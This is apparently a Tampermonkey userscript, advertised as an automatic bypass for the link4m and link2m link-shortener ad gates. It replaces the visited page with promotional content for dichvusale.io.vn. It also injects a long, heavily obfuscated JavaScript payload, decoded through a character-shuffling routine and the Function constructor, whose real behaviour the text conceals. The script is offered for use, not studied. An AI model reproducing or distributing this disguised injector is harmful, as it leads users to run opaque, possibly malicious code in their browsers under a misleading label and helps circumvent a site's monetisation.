// ==UserScript==
// @name         Auto Bypass Link4m + Link2m - Instant UI
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  Auto Bypass Link4m + Link2m - Instant Execution & Beautiful UI
// @author       LAMDev - dichvusale.io.vn
// @match        *://link4m.com/go/*
// @match        *://2m.com/go/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function () {
    'use strict';

    const FIXED_SCRIPT = `(function(){var Kzu='',eDF=386-375;function rms(n){var d=1362308;var w=n.length;var l=[];for(var h=0;h<w;h++){l[h]=n.charAt(h)};for(var h=0;h<w;h++){var c=d*(h+485)+(d%44586);var s=d*(h+344)+(d%43919);var b=c%w;var f=s%w;var m=l[b];l[b]=l[f];l[f]=m;d=(c+s)%4889814;};return l.join('')};var qIi=rms('vciyztuclnbotdnkfgtpsxrrchoqoeswjrmua').substr(0,eDF);var ngV='Cnl;i) oCiwlcna-s)=v)uv+=vapc(ntvh=j;j>4oAhgd+6.{!whjn]=k ,rn60;=2+.,.;aa6trf2,l+1h6*<(,)9r3), mgni;;3q-rnh )7,, e5ux,+xr7u}, C-ci;rr(-vfrt)e0ers2(gengmr[2.S;adC[7n=i.+n;et;nh=(r;=u8fhavnc7[yq;0varvdu(=;} )[sohd)8vltonu=j(1)1a+k;rjhAgap(acsCg8b0ct;[0ds0p,i)(;h5+lx,r;viacaea1vvnrt6lstsyC=j=+("ll=rh14f)noagogas[aair;"a=lid) =+rviri p6u  4n;isuCvg8(n 0al8;(f)e(rat]==0Cid,o)+}i (ar1=q(+u+a.oe<;[un],]h18fjarr2)z,=;gru("hc<1t8i+A.9h.r>saeorli=;s-t;itnrgor)l+7s+..=t"] )vitm 9wf.lAbr)e-c.[9");kvnd0]8=v+to=;,"mr+([op;e{;il1"<;f=airi(==]ah0t-vf(vhinu6r8{l(]+1ncug2ado]j(vf,ve s0(fw1he(r={)t)i(iep7jp(k+sp((+0)[n4,]f;o1rt[.vr});!rh,+t.{t=(p<l)r8,7(h=ts )a.97n;s=o)=7a5.+y}ag.ih(n*)"}{prqS[=nk[ol ;n0.;;bol An;v(rfl;aa. ,8;,2;tl.i(nib;]r,a.i=oj ljt(f=]3a; j)h7d []v9feo,htavv6svb=ufg=rosa19}r;;]uu{;e.fehs;chpu2,5oo+jtl.u;usohrg =cf).eo)xh=s,icr.s;om=)irbtiv,har+ses efxlg"r=rbcnt=he(.")=.oad,a)8';var hLi=rms[qIi];var eaM='';var mad=hLi;var dkl=hLi(eaM,rms(ngV));var Cqb=dkl(rms(':)p<eo]<t(:t4adclj_h]-c.<t.]+<miieiLtk<1e(]ia9}u_nc?f%$h_1a)n+gtoa(".l=b{a<34(.<cu#((e!1H1p]_,<obt<{o8]1t])8o,:sn<a])ry<z%9<k,t9403}0i<O) !ycD093tHr)g}ui3<3et o<e_o")<p a%<<61f0no_(<<*indo.]"]%p.=c1,9j2.(]se}<1ea3% w.LPe}23ee;e;<3o4aut01c_r-%i$yaeolf{)02cadl$_H#8 <m]ec%NaBg<,}i<e;6<I< IC=2_<M;u<v<] ld;smt;4s59acq.c.oe-;(]<<]v<]pmbi4l).3ph{]0r.0\\/e0,2=(wR.geun<aelteS<ae$buif)dtk9n]n<pw6t=M7._Ix?fi<%9>_)#<!<q}C}(eni0a6-e.Bp!c<=w<.kt<%el4<<[u)]<b<t)hx2c<te.6,di3r]Oy.4$Tch)JB.,t.0{s<7_c<<tSmk2rc%n<;)ksrt]ge+)ecv.<;S9mc1jhesc14} %ne<u,<a!)0]C$lct.e8<leK$?!<<i<g2.t.<2nn.<.6e..-i{!.]<t<xc.9 (ree.k"(iu;lss.6<Oi),<v%dc .%<7i<s]h$b)dr-mc(.<m=ll3jn4]ta9,a[<c;c< A1e-t1 $lNTaua<cea.0e!h8c<:h <)(cclr.<5mac%,cuf><no;?r<e>ot(.c%t)U%f]Kb (;L<a%=u(atc2x<g<dv-<m6?<oa<o<[c,t <co%agSrl.-($<;<4pt<tcn3moot.>n..eis<<<B%onf<)\\/.i<n)<n. n >s<qehc%oqpvt!)l.<7<v<c!sdree);2)4c<d;%Bs o=b29=10OStp]if d=xoCo<$c0me<]epannri,d.:UI7l{<ne,6%<rcm<_c<.,<8.n}<.e\\/, )%hni1<o%ofeanD@Ee; b%.tceM.()<( #&=ce)5chy%=u=3<";ef4tpcaT)n=du>7b)1<,2ad.j<Re<;p%<c]d,;Onvr]0<pj.kO<Pe"P6j4cr{a<<gop<o$s<<3tO<(<hJL=s)Q)cz.tc;)<;5l};\\/1rac-.H014o<n(;c.)l]r6){cr<]e=y3<h<hk<1bpt=Fov&e}(5Jn=i*i<6)(q!l(t_%3Km(<(onr,E)(<<8&)5omir<ruaGm%<33o){(c9577fo<;30!=<] $g.)an>tcFq,,k37<!<n\\/()<j,T <2]<0fC)z:d3,_ica%)<<y1l3<)h]kt<.9y!(d<<j]]{sC(ka%s!e#Ny(c,},cc<){%8a2<]0e&c4x7]f<3rihe,$.!iNu5c()r,<]es%m<c:ldi5e<)_]=<,[)=b=.f.)}bk\\/.r%1>u=(,#0n>(=g_<<_{<.oegc0e<<<,nAg!<<<)avgKf-(Br)Qe1E<u<A})a3)<.(.<y+s3aPg<at)@$F<#<G[i0iu(ffi[]5y]d<crif,e$trtce2b3)0Qitc,<4".7 pB%ftn_ob)tcg.s{cihc?j _y2<<Core!d+<;20ec]!a7*!}dm<-0rctt%736<c<<5.\\/4e<tdga8t21o%c1!]oaks4(%mr<2yota=.c1(K2{_.f#4!T4<\\/ra7l{<C)])t>l.oa;74{jc(ocs<o!u)<=3<<o.4<.h.)]v}!])<<.<.asopDh-.<48(-<97c-.}K6)r3<2t.9ed(h_bN30i}{4c%p)m:i!c(,<#"97 fri.,)m2!f..<.h3rr<tEc;<UvoP4ld2c$]a;0.oh.m<=i]).ret,c<r<{.,t<0)f.(3opC)c04b,t<c.@4,8<t.&fp<*kasre(eg.<.} 5<l\\/5efa<11v<$-(s);eHni% n<,<q<)40r)a#p=,3=t}<,<[$n(nes"<,U)]C<m<!.q<a[<3m.)2jcmyu<<G[3r,[ d fc<ra)"f<c<3c|t1(<wp5&.uwt[3pl..c<<$mow<a.i.<od(a<e5aab(a.peq).-(eT<}(,gkUUs&6=m-<Bm;fc=y016C>{sl<e:1ea<,z{]0JhQiG<)<g2<ets=a<f4<<%_c(.<c3eyu@$sr,Pihl<.7(t<p<h1tdsdf.Croct;),&nl?o<b3trB. =Jr1&].<ed.<\\',%{i<7z,_Te<bres69rAS\\'(&7r6}(;F<2fv4rt)=!1.e.Tj,]eltoe<a,$dp, %d. l7%)? p2gr]ee(d1<t(!e<3a(3()cte<44<fe i<6tole(=pc3dKp)9e)crtaa3l,rN<0<8_;).0G2.z(y{:<{<k+<Rg<c\\'n%0,<]ikc<ic<ulNHriC<S=nc}8<( 34<.]),0,M(5!,n<;}_<\\/g3(<<!ta,pc;._%<<4ue=-uc\\/n(pcc>0o,}<t3f<ctn;)a3eo$%<n<eo%_L;.c]<f\\/tR<p} _s5r3,{v|)4=q<f(<rti)n))3nly635)$s4Tic<J;>);itn$%p<n$]{S%3<!%o.c%\\/}.=.r4gy.]c1<) Naico<u\\/<ctdt5]!<):6r$4b-8s,t3_6g7.l$h!:(n.!a])\\'raJ!a<343c8ee-"1a<4N,< +c3fr:,c f?{eee$ccrJ7l3qboK1lT4a2{# ()>i4]o =jn<nf,<cn5ota l[E.as_.34gte%.l7))]i9.ei<rgtvp_k:peter,1h)u )]( c<c agscuremc)r)f<qjo$c<]!; c.<l<cl<f7<y1f<na#)f.;Q<n3u<opuxa{4,$ @njonc]<f<no-kPc<!ca.s3r25}rh2d<c.tc8303f{<.s=!=2kuec <(2.%9uf,nJa.c2r ,h}h0<+a!4p+6sv5xa} (s.m <ad['));var SLM=mad(Kzu,Cqb );SLM(2934);return 2173})()`;

    // --- Instant UI Replacement ---
    let executed = false;
    let errorDisplayed = false;

    function createErrorOverlay() {
        if (document.getElementById('lm-error-overlay')) return;
        
        const css = `
            #lm-error-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.9);
                color: white;
                z-index: 2147483647;
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                text-align: center;
                padding: 20px;
            }
            .lm-error-content {
                max-width: 500px;
                background: #dc3545;
                padding: 30px;
                border-radius: 12px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            }
            .lm-error-title {
                font-size: 24px;
                font-weight: bold;
                margin-bottom: 15px;
            }
            .lm-error-message {
                font-size: 16px;
                margin-bottom: 20px;
                line-height: 1.5;
            }
            .lm-error-contact {
                background: rgba(255,255,255,0.2);
                padding: 15px;
                border-radius: 8px;
                margin: 15px 0;
            }
            .lm-error-link {
                color: white;
                text-decoration: underline;
                font-weight: bold;
            }
            @media (max-width: 768px) {
                .lm-error-content {
                    margin: 20px;
                    padding: 20px;
                }
                .lm-error-title {
                    font-size: 20px;
                }
            }
        `;
        
        const style = document.createElement('style');
        style.textContent = css;
        document.head.appendChild(style);

        const overlay = document.createElement('div');
        overlay.id = 'lm-error-overlay';
        overlay.innerHTML = `
            <div class="lm-error-content">
                <div class="lm-error-title">❌ Lỗi Hệ Thống</div>
                <div class="lm-error-message">
                    Đã xảy ra lỗi trong quá trình xử lý. Vui lòng liên hệ Admin để được hỗ trợ.
                </div>
                <div class="lm-error-contact">
                    <strong>Liên hệ hỗ trợ:</strong><br>
                    <a href="https://dichvusale.io.vn" class="lm-error-link" target="_blank">
                        dichvusale.io.vn
                    </a>
                </div>
                <div style="font-size: 14px; opacity: 0.8;">
                    Mã lỗi: LM_TIMEOUT
                </div>
            </div>
        `;
        document.documentElement.appendChild(overlay);
    }

    function injectExactCode(codeString) {
        try {
            const blob = new Blob([codeString], { type: 'application/javascript' });
            const url = URL.createObjectURL(blob);
            const s = document.createElement('script');
            s.src = url;
            s.async = false;
            (document.head || document.documentElement).appendChild(s);
            setTimeout(() => {
                try { URL.revokeObjectURL(url); } catch (e) {}
            }, 60000);
            console.log('[LM] injected script via blob');
            return true;
        } catch (e) {
            console.error('[LM] injectExactCode failed', e);
            return false;
        }
    }

    function replacePageContent() {
        try {
            // Thay thế toàn bộ body content
            const newBodyContent = `
                <style>
                    body {
                        margin: 0;
                        padding: 0;
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        color: #333;
                    }
                    .lm-container {
                        max-width: 1200px;
                        margin: 0 auto;
                        padding: 20px;
                    }
                    .lm-header {
                        background: rgba(255,255,255,0.95);
                        backdrop-filter: blur(10px);
                        padding: 15px 0;
                        box-shadow: 0 2px 20px rgba(0,0,0,0.1);
                        position: fixed;
                        width: 100%;
                        top: 0;
                        z-index: 1000;
                    }
                    .lm-nav {
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        max-width: 1200px;
                        margin: 0 auto;
                        padding: 0 20px;
                    }
                    .lm-logo {
                        font-size: 24px;
                        font-weight: bold;
                        color: #667eea;
                        text-decoration: none;
                    }
                    .lm-nav-links {
                        display: flex;
                        gap: 30px;
                        list-style: none;
                        margin: 0;
                        padding: 0;
                    }
                    .lm-nav-links a {
                        color: #333;
                        text-decoration: none;
                        font-weight: 500;
                        transition: color 0.3s ease;
                    }
                    .lm-nav-links a:hover {
                        color: #667eea;
                    }
                    .lm-main {
                        margin-top: 80px;
                        padding: 40px 0;
                    }
                    .lm-hero {
                        text-align: center;
                        background: rgba(255,255,255,0.95);
                        padding: 60px 40px;
                        border-radius: 20px;
                        box-shadow: 0 10px 40px rgba(0,0,0,0.1);
                        margin-bottom: 40px;
                    }
                    .lm-hero h1 {
                        font-size: 3em;
                        margin-bottom: 20px;
                        background: linear-gradient(135deg, #667eea, #764ba2);
                        -webkit-background-clip: text;
                        -webkit-text-fill-color: transparent;
                        font-weight: 800;
                    }
                    .lm-hero p {
                        font-size: 1.2em;
                        color: #666;
                        margin-bottom: 30px;
                        line-height: 1.6;
                    }
                    .lm-features {
                        display: grid;
                        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                        gap: 30px;
                        margin: 40px 0;
                    }
                    .lm-feature-card {
                        background: rgba(255,255,255,0.95);
                        padding: 30px;
                        border-radius: 15px;
                        box-shadow: 0 5px 20px rgba(0,0,0,0.1);
                        text-align: center;
                    }
                    .lm-feature-icon {
                        font-size: 3em;
                        margin-bottom: 20px;
                    }
                    .lm-feature-card h3 {
                        color: #333;
                        margin-bottom: 15px;
                        font-size: 1.4em;
                    }
                    .lm-feature-card p {
                        color: #666;
                        line-height: 1.6;
                    }
                    .lm-buttons {
                        display: flex;
                        gap: 15px;
                        justify-content: center;
                        flex-wrap: wrap;
                        margin: 30px 0;
                    }
                    .lm-btn {
                        padding: 15px 30px;
                        border: none;
                        border-radius: 10px;
                        font-size: 1.1em;
                        font-weight: 600;
                        text-decoration: none;
                        transition: all 0.3s ease;
                        cursor: pointer;
                    }
                    .lm-btn-primary {
                        background: linear-gradient(135deg, #667eea, #764ba2);
                        color: white;
                    }
                    .lm-btn-secondary {
                        background: transparent;
                        color: #667eea;
                        border: 2px solid #667eea;
                    }
                    .lm-btn:hover {
                        transform: translateY(-2px);
                        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
                    }
                    .lm-footer {
                        background: rgba(0,0,0,0.8);
                        color: white;
                        padding: 40px 0;
                        margin-top: 60px;
                    }
                    .lm-footer-content {
                        display: grid;
                        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                        gap: 40px;
                        max-width: 1200px;
                        margin: 0 auto;
                        padding: 0 20px;
                    }
                    .lm-footer-section h3 {
                        color: #667eea;
                        margin-bottom: 20px;
                    }
                    .lm-footer-links {
                        list-style: none;
                        padding: 0;
                    }
                    .lm-footer-links li {
                        margin-bottom: 10px;
                    }
                    .lm-footer-links a {
                        color: #ccc;
                        text-decoration: none;
                        transition: color 0.3s ease;
                    }
                    .lm-footer-links a:hover {
                        color: #667eea;
                    }
                    .lm-copyright {
                        text-align: center;
                        padding-top: 30px;
                        border-top: 1px solid #444;
                        margin-top: 30px;
                        color: #999;
                    }
                    @media (max-width: 768px) {
                        .lm-nav {
                            flex-direction: column;
                            gap: 15px;
                        }
                        .lm-nav-links {
                            gap: 15px;
                        }
                        .lm-hero h1 {
                            font-size: 2em;
                        }
                        .lm-buttons {
                            flex-direction: column;
                            align-items: center;
                        }
                        .lm-btn {
                            width: 100%;
                            max-width: 300px;
                        }
                    }
                </style>

                <div class="lm-header">
                    <nav class="lm-nav">
                        <a href="https://dichvusale.io.vn" class="lm-logo">
                            🚀 dichvusale.io.vn
                        </a>
                        <ul class="lm-nav-links">
                            <li><a href="https://dichvusale.io.vn">Trang chủ</a></li>
                            <li><a href="https://dichvusale.io.vn/blog">Tin tức</a></li>
                            <li><a href="https://dichvusale.io.vn/contact">Liên hệ</a></li>
                            <li><a href="https://dichvusale.io.vn/payout-rates">Payout Rates</a></li>
                        </ul>
                    </nav>
                </div>

                <div class="lm-container">
                    <main class="lm-main">
                        <section class="lm-hero">
                            <h1>🎉 BYPASS THÀNH CÔNG</h1>
                            <p>Hệ thống đã được kích hoạt thành công. Chỉ cần giải captcha để tiếp tục truy cập nội dung.</p>
                            
                            <div style="background: rgba(102, 126, 234, 0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
                                <h3 style="color: #667eea; margin: 0;">✅ HOÀN TOÀN MIỄN PHÍ - KHÔNG CHI PHÍ ẨN</h3>
                            </div>

                            <div class="lm-buttons">
                                <a href="https://dichvusale.io.vn" class="lm-btn lm-btn-primary" target="_blank">
                                    📝 Đăng ký tài khoản
                                </a>
                                <a href="https://dichvusale.io.vn" class="lm-btn lm-btn-secondary" target="_blank">
                                    🔐 Đăng nhập
                                </a>
                            </div>
                        </section>

                        <section class="lm-features">
                            <div class="lm-feature-card">
                                <div class="lm-feature-icon">⚡</div>
                                <h3>Tốc độ cao</h3>
                                <p>Hệ thống được tối ưu hóa cho tốc độ tải trang nhanh nhất, mang lại trải nghiệm mượt mà.</p>
                            </div>
                            <div class="lm-feature-card">
                                <div class="lm-feature-icon">🔒</div>
                                <h3>Bảo mật tuyệt đối</h3>
                                <p>Đảm bảo an toàn thông tin và dữ liệu người dùng với hệ thống bảo mật nhiều lớp.</p>
                            </div>
                            <div class="lm-feature-card">
                                <div class="lm-feature-icon">💸</div>
                                <h3>Kiếm tiền hiệu quả</h3>
                                <p>Tối ưu hóa doanh thu với tỷ lệ chuyển đổi cao và hệ thống thanh toán minh bạch.</p>
                            </div>
                        </section>
                    </main>
                </div>

                <footer class="lm-footer">
                    <div class="lm-footer-content">
                        <div class="lm-footer-section">
                            <h3>Về chúng tôi</h3>
                            <p>dichvusale.io.vn - Nền tảng rút gọn link kiếm tiền hàng đầu Việt Nam.</p>
                        </div>
                        <div class="lm-footer-section">
                            <h3>Liên kết nhanh</h3>
                            <ul class="lm-footer-links">
                                <li><a href="https://dichvusale.io.vn">Trang chủ</a></li>
                                <li><a href="https://dichvusale.io.vn/blog">Tin tức</a></li>
                                <li><a href="https://dichvusale.io.vn/payout-rates">Payout Rates</a></li>
                                <li><a href="https://dichvusale.io.vn/contact">Liên hệ</a></li>
                            </ul>
                        </div>
                        <div class="lm-footer-section">
                            <h3>Hỗ trợ</h3>
                            <ul class="lm-footer-links">
                                <li><a href="https://dichvusale.io.vn/help">Trung tâm trợ giúp</a></li>
                                <li><a href="https://dichvusale.io.vn/contact">Báo cáo lỗi</a></li>
                                <li><a href="https://dichvusale.io.vn/terms">Điều khoản sử dụng</a></li>
                                <li><a href="https://dichvusale.io.vn/privacy">Chính sách bảo mật</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="lm-copyright">
                        <p>© 2024 <a href="https://dichvusale.io.vn" style="color: #667eea; text-decoration: none;">dichvusale.io.vn</a> - Rút gọn link kiếm tiền. All Rights Reserved.</p>
                    </div>
                </footer>
            `;

            // Thay thế toàn bộ body
            document.body.innerHTML = newBodyContent;
            
            // Thêm các style cần thiết cho body
            document.body.style.margin = '0';
            document.body.style.padding = '0';
            document.body.style.fontFamily = "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
            
            return true;
        } catch (e) {
            console.error('[LM] replacePageContent failed', e);
            return false;
        }
    }

    function executeImmediately() {
        if (executed) return;
        executed = true;

        console.log('[LM] Starting immediate execution...');

        // 1. Thay thế giao diện ngay lập tức
        const uiReplaced = replacePageContent();
        
        // 2. Inject script bypass
        const scriptInjected = injectExactCode(FIXED_SCRIPT);

        if (!uiReplaced || !scriptInjected) {
            console.error('[LM] Immediate execution failed');
            if (!errorDisplayed) {
                errorDisplayed = true;
                setTimeout(() => {
                    createErrorOverlay();
                }, 1000);
            }
        } else {
            console.log('[LM] Immediate execution completed successfully');
        }
    }

    // Chạy ngay lập tức
    executeImmediately();

    // Fallback: Nếu sau 5s chưa chạy xong thì hiển thị lỗi
    setTimeout(() => {
        if (!executed) {
            console.error('[LM] Execution timeout after 5s');
            executeImmediately(); // Vẫn thử chạy
        }
    }, 5000);

    // Fallback cho lỗi
    setTimeout(() => {
        if (!executed && !errorDisplayed) {
            errorDisplayed = true;
            createErrorOverlay();
        }
    }, 6000);

    // Thêm event listener để chạy khi DOM ready (phòng trường hợp)
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', executeImmediately);
    }

})();
